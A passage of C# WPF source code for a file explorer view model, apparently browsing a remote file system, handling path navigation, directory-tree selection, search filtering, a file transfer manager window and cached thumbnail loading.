                    fileExplorerEntries.OfType<PackedDirectoryEntry>()
                        .Select(x => new DirectoryNodeViewModel(x, _fileSystem)));

            var currentNormalizedPath = CurrentPath.NormalizePath();
            entries.AddRange(
                FileTransferManagerViewModel.FileTransferTasks.Where(
                        x => x.IsUpload && x.TargetPath.NormalizePath().Equals(currentNormalizedPath))
                    .Select(x => new ProcessingEntryViewModel(x, _fileSystem)));

            entries.AddRange(
                fileExplorerEntries.Select(x =>
                {
                    if (x is FileEntry fileEntry)
                        return (IEntryViewModel) new FileEntryViewModel(fileEntry, _fileSystem);
                    if (x is ProcessingEntry processingEntry)
                        return new ProcessingEntryViewModel(processingEntry,
                            y => Task.Run(() => _fileExplorerCommand.CancelProcessingEntry(y)), _fileSystem);
                    return null;
                }).Where(x => x != null).OrderBy(x => x.Name));

            _entriesViewModels = new ObservableCollection<IEntryViewModel>(entries);
            Entries = new CollectionViewSource {Source = _entriesViewModels};
            Entries.Filter += EntriesOnFilter;
            Entries.SortDescriptions.Add(new SortDescription("IsDirectory", ListSortDirection.Descending));
            Entries.SortDescriptions.Add(new SortDescription("SortingName", ListSortDirection.Ascending));
            Entries.LiveSortingProperties.Add("SortingName");
            Entries.IsLiveSortingRequested = true;
        }

        private void EntriesOnFilter(object sender, FilterEventArgs filterEventArgs)
        {
            filterEventArgs.Accepted = Filter(filterEventArgs.Item);
        }

        private bool Filter(object o)
        {
            if (string.IsNullOrEmpty(SearchText))
                return true;

            var entry = (IEntryViewModel) o;
            if (entry.Value.Name.IndexOf(SearchText, StringComparison.OrdinalIgnoreCase) > -1)
                return true;

            return false;
        }

        private async void OpenPath(string path, bool refresh = false)
        {
            if (!refresh && string.Equals(path, CurrentPath, StringComparison.OrdinalIgnoreCase))
                return;

#if DEBUG
            var sw = Stopwatch.StartNew();
#endif
            PathContent pathContent;
            IsLoading = true;
            _openPathCancellationToken?.Cancel();
            _openPathCancellationToken = new CancellationTokenSource();
            var token = _openPathCancellationToken.Token;
            try
            {
                pathContent = await _fileSystem.RequestPathContent(path, refresh);
            }
            catch (Exception)
            {
                Logger.Error(string.Format((string) Application.Current.Resources["RequestingPathFailed"], path));
                return;
            }
            finally
            {
                IsLoading = false;
            }

            if (token.IsCancellationRequested)
                return;

            var keepOrder = pathContent.Path == "::{20D04FE0-3AEA-1069-A2D8-08002B30309D}";

#if DEBUG
            Debug.Print(sw.ElapsedMilliseconds.ToString());
#endif

            CurrentPath = pathContent.Path; /* string.Equals(pathContent.Path, path, StringComparison.OrdinalIgnoreCase)
                ? pathContent.Path
                : path;*/

            PathHistoryManager.Navigate(CurrentPath);

            //if the path is already selected don't do anything else than generating the entries
            if (DirectoryTreeViewModel.Selection.IsChildSelected &&
                string.Equals(CurrentPath, DirectoryTreeViewModel.Selection.AsRoot().SelectedValue.Path,
                    StringComparison.OrdinalIgnoreCase))
            {
                GenerateEntries(pathContent.Entries, keepOrder);
                return;
            }

            var selectedViewModel = DirectoryTreeViewModel.Selection.AsRoot().SelectedViewModel;
            if (selectedViewModel != null)
            {
                if (selectedViewModel.Entries.IsLoaded)
                {
                    var subEntry =
                        selectedViewModel.Entries.All.FirstOrDefault(
                            x => string.Equals(x.Value.Path, CurrentPath, StringComparison.OrdinalIgnoreCase));
                    if (subEntry != null)
                    {
                        selectedViewModel.Selection.IsSelected = false;
                        subEntry.Entries.IsExpanded = true;
                        subEntry.Selection.IsSelected = true;
                        subEntry.IsBringIntoView = true;

                        GenerateEntries(pathContent.Entries, keepOrder);
                        return;
                    }
                }
            }

            //check if there is any root view model which the path starts with
            var rootTreeNodeViewModel =
                DirectoryTreeViewModel.Entries.All.FirstOrDefault(
                    x => CurrentPath.StartsWith(x.Value.Path, StringComparison.OrdinalIgnoreCase));

            if (rootTreeNodeViewModel != null &&
                (rootTreeNodeViewModel.Selection.IsSelected || rootTreeNodeViewModel.Selection.IsChildSelected))
            {
                var currentPathPart =
                    pathContent.PathParts.First(
                        x => string.Equals(x.Path, CurrentPath, StringComparison.OrdinalIgnoreCase));

                if (rootTreeNodeViewModel.Value.Path.Equals(CurrentPath, StringComparison.OrdinalIgnoreCase))
                {
                    rootTreeNodeViewModel.Entries.IsExpanded = true;
                    rootTreeNodeViewModel.Selection.IsSelected = true;
                    rootTreeNodeViewModel.IsBringIntoView = true;
                    if (!rootTreeNodeViewModel.Entries.IsLoaded)
                        await rootTreeNodeViewModel.Entries.LoadAsync();
                }
                else
                {
                    await
                        RecursiveSelect(pathContent.PathParts, pathContent.PathParts.IndexOf(currentPathPart),
                            rootTreeNodeViewModel);
                }

                GenerateEntries(pathContent.Entries, keepOrder);
                return;
            }

            var pathRoot = pathContent.PathParts[0];

            DirectoryNodeViewModel rootEntry = null;
            foreach (var directoryNodeViewModel in DirectoryTreeViewModel.Entries.All)
            {
                if (directoryNodeViewModel.Value.Equals(pathRoot))
                    rootEntry = directoryNodeViewModel;
                else if (directoryNodeViewModel.Entries.IsLoaded)
                {
                    rootEntry =
                        directoryNodeViewModel.Entries.All.FirstOrDefault(
                            x => CurrentPath.StartsWith(x.Value.Path, StringComparison.OrdinalIgnoreCase)) ??
                        directoryNodeViewModel.Entries.All.FirstOrDefault(x => x.Value == pathRoot);
                    if (rootEntry == null)
                        continue;
                }
                else
                    continue;

                break;
            }

            if (selectedViewModel != null)
                selectedViewModel.Selection.IsSelected = false;

            if (rootEntry == null)
            {
                //fuck it
                GenerateEntries(pathContent.Entries, keepOrder);
                return;
            }

            if (rootEntry.Value.Equals(pathContent.Directory))
            {
                if (!rootEntry.Entries.IsLoaded)
                    await rootEntry.Entries.LoadAsync();

                rootEntry.Entries.IsExpanded = true;
                rootEntry.Selection.IsSelected = true;
                rootEntry.IsBringIntoView = true;
            }
            else
            {
                await
                    RecursiveSelect(pathContent.PathParts,
                        pathContent.PathParts.IndexOf(
                            pathContent.PathParts.First(
                                x => x.Path.Equals(rootEntry.Value.Path, StringComparison.OrdinalIgnoreCase))) + 1,
                        rootEntry);
                rootEntry.Entries.IsExpanded = true;
            }
            GenerateEntries(pathContent.Entries, keepOrder);

#if DEBUG
            Debug.Print(sw.ElapsedMilliseconds.ToString());
#endif
        }

        private async Task<List<DirectoryNodeViewModel>> RecursiveSelect(List<DirectoryEntry> entries, int index,
            DirectoryNodeViewModel directoryNodeViewModel)
        {
            var currentEntry = entries[index];
            if (!directoryNodeViewModel.Entries.IsLoaded)
                await directoryNodeViewModel.Entries.LoadAsync();

            foreach (var viewModel in directoryNodeViewModel.Entries.All)
            {
                if (viewModel.Value.Equals(currentEntry))
                {
                    if (index == entries.Count - 1)
                    {
                        viewModel.Selection.IsSelected = true;
                        viewModel.IsBringIntoView = true;
                        if (!viewModel.Entries.IsLoaded)
                            await viewModel.Entries.LoadAsync();
                        return viewModel.Entries.All.ToList();
                    }
                    var result = await RecursiveSelect(entries, index + 1, viewModel);
                    viewModel.Entries.IsExpanded = true;
                    return result;
                }
            }

            return null;
        }

        private void OnSelectionChanged(object sender, EventArgs eventArgs)
        {
            var root = DirectoryTreeViewModel.Selection.AsRoot();
            var currentItem = root.SelectedViewModel;
            currentItem.IsBringIntoView = true;
            if (currentItem.Parent != null)
                currentItem.Parent.Entries.IsExpanded = true;

            OpenPath(currentItem.Value.Path);
        }

        private void OpenFileTransferManager()
        {
            if (_fileExplorerTransferManagerWindow == null)
            {
                FileTransferManagerViewModel.DialogResult = null;
                _fileExplorerTransferManagerWindow =
                    WindowServiceInterface.Current.OpenWindowCentered(WindowService, FileTransferManagerViewModel).Value;
                _fileExplorerTransferManagerWindow.Closed += (sender, args) => _fileExplorerTransferManagerWindow = null;
            }
            else
            {
                _fileExplorerTransferManagerWindow.Activate();
            }
        }

        private async void GetFileThumbnails()
        {
            _thumbnailLoadingCancellationTokenSource?.Cancel();
            _thumbnailLoadingCancellationTokenSource = new CancellationTokenSource();

            var token = _thumbnailLoadingCancellationTokenSource.Token;
            var range = VisibleItemsRange;
            var count = range.Count;

            if (count + range.StartIndex > _entriesViewModels.Count)
                count = _entriesViewModels.Count - range.StartIndex;

            for (int i = 0; i < count; i++)
            {
                var entry = _entriesViewModels[i + range.StartIndex];
                if (entry.EntryType != EntryType.File)
                    continue;

                var fileEntry = (FileEntryViewModel) entry;
                if (_thumbnailQueue.Contains(fileEntry))
                    _thumbnailQueue.Remove(fileEntry);

                if (fileEntry.IsLoadingThumbnail || fileEntry.Thumbnail != null)
                {
                    //reposition the entry (bring to front)
                    _thumbnailQueue.Insert(0, fileEntry);
                    continue;
                }

                fileEntry.IsLoadingThumbnail = true;

                // ReSharper disable once MethodSupportsCancellation
                var data = await Task.Run(() => _fileExplorerCommand.GetFileThumbnail(entry.Value.Path, false));

                var image = new BitmapImage();
                using (var mem = new MemoryStream(data))
                {
                    mem.Position = 0;
                    image.BeginInit();
                    image.CreateOptions = BitmapCreateOptions.PreservePixelFormat;
                    image.CacheOption = BitmapCacheOption.OnLoad;
                    image.UriSource = null;
                    image.StreamSource = mem;
                    image.EndInit();
                }
                image.Freeze();

                fileEntry.Thumbnail = image;
                fileEntry.IsLoadingThumbnail = false;
                _thumbnailQueue.Insert(0, fileEntry);

                while (_thumbnailQueue.Count > GlobalConsts.FileExplorer_MaxCachedThumbnails)
                {
                    var lastEntry = _thumbnailQueue[_thumbnailQueue.Count - 1];
                    _thumbnailQueue.Remove(lastEntry);
                    lastEntry.Thumbnail = null;
                    lastEntry.IsLoadingThumbnail = false;
                }

                if (token.IsCancellationRequested)
                    return;
            }
        }
    }
}